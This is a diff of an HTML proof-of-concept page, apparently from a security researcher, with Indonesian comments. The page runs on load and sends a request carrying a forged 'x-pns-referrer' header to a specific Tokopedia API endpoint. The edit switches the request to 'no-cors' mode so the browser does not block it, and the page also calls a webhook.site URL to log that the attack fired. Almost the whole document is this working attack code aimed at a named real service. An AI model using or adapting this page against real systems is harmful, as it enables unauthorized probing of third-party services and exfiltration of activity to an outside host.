@@ -2,65 +2,99 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Security Research - Header Integrity Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research - Header Spoofing PoC</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-        .container { border: 2px solid #00ff00; display: inline-block; padding: 30px; background: #000; box-shadow: 0 0 15px #00ff00; }
-        .status { font-size: 20px; margin-bottom: 20px; }
-        #details { color: #888; font-size: 14px; }
+        body { 
+            background: #0a0a0a; 
+            color: #00ff00; 
+            font-family: 'Courier New', monospace; 
+            text-align: center; 
+            padding-top: 100px; 
+            margin: 0;
+        }
+        .container { 
+            border: 2px solid #00ff00; 
+            display: inline-block; 
+            padding: 40px; 
+            background: #000; 
+            box-shadow: 0 0 20px #00ff00; 
+            border-radius: 10px;
+        }
+        .status { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
+        #details { color: #888; font-size: 16px; line-height: 1.6; }
+        .blink { animation: blinker 1s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .log-box { margin-top: 30px; text-align: left; font-size: 12px; color: #444; border-top: 1px solid #222; padding-top: 10px; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="status" id="status">[ INITIALIZING TEST ]</div>
-        <p id="sub-status">Attempting Header Spoofing on Privacy API...</p>
-        <div id="details">Waiting for execution...</div>
+        <div class="status" id="status">[ INITIALIZING ]</div>
+        <p id="sub-status" class="blink">Preparing Header Injection...</p>
+        <div id="details">Ready to audit: shop-id.tokopedia.com</div>
+        
+        <div class="log-box" id="log">
+            > System ready...<br>
+        </div>
     </div>
 
     <script>
         const statusH1 = document.getElementById('status');
+        const statusP = document.getElementById('sub-status');
         const details = document.getElementById('details');
+        const logBox = document.getElementById('log');
         
         // --- KONFIGURASI ---
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI DENGAN ID WEBHOOK LU
+        // GANTI DENGAN URL WEBHOOK.SITE LU
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
         const targetApi = "https://shop-id.tokopedia.com/api/v1/web-cookie-privacy/config?locale=en&appId=1988";
 
-        async function startExploit() {
-            try {
-                statusH1.innerText = "[ EXECUTING SPOOFING ]";
-                details.innerText = "Sending forged x-pns-referrer to Tokopedia API...";
+        function addLog(msg) {
+            logBox.innerHTML += "> " + msg + "<br>";
+        }
 
-                // Kita menembak API dengan header palsu
-                const response = await fetch(targetApi, {
+        async function startExploit() {
+            addLog("Starting exploit sequence...");
+            statusH1.innerText = "[ EXECUTING ]";
+            statusP.innerText = "Firing Spoofed Request...";
+
+            try {
+                // Menggunakan mode: 'no-cors' agar request tetap terkirim ke server 
+                // tanpa terblokir oleh kebijakan browser di sisi UI.
+                fetch(targetApi, {
                     method: "GET",
-                    mode: "cors",
+                    mode: "no-cors", 
                     headers: {
                         "x-pns-referrer": "https://fadhlur21.github.io/exploit-poc",
-                        "x-custom-audit": "vulnerability-found"
+                        "x-attacker-id": "fadhlur_research"
                     }
                 });
 
-                if (response.status === 200) {
-                    statusH1.innerText = "[ SUCCESS: 200 OK ]";
+                addLog("Request dispatched via fetch (no-cors).");
+                
+                // Kirim notifikasi ke webhook lu sebagai log aktivitas
+                fetch(webhook + "?event=header_spoofing_fired&target=tokopedia_api");
+
+                setTimeout(() => {
+                    statusH1.innerText = "[ ATTACK SENT ]";
                     statusH1.style.color = "#ffff00";
-                    details.innerHTML = "Server accepted forged headers!<br>Check Reqable & Webhook now.";
-                    
-                    // Kirim konfirmasi ke Webhook lu bahwa spoofing berhasil
-                    fetch(webhook + "?status=spoofing_success&origin=github_pages");
-                } else {
-                    statusH1.innerText = "[ FAILED ]";
-                    details.innerText = "Status Code: " + response.status;
-                }
+                    statusP.innerText = "Check Reqable Logs Now";
+                    statusP.classList.remove('blink');
+                    details.innerHTML = "PoC Complete.<br>Server-side should have received the forged x-pns-referrer header.";
+                    addLog("Exploit cycle finished.");
+                }, 2000);
+
             } catch (err) {
-                statusH1.innerText = "[ ERROR ]";
-                details.innerText = "CORS Blocked or Network Error. Check Reqable Logs.";
-                console.error(err);
+                addLog("Error: " + err.message);
+                statusH1.innerText = "[ FAILED ]";
+                details.innerText = "Check Browser Console for details.";
             }
         }
 
-        // Jalankan setelah 2 detik agar lu sempat siap-siap rekam
-        setTimeout(startExploit, 2000);
+        // Jalankan otomatis setelah 3 detik
+        setTimeout(startExploit, 3000);
     </script>
 </body>
 </html>
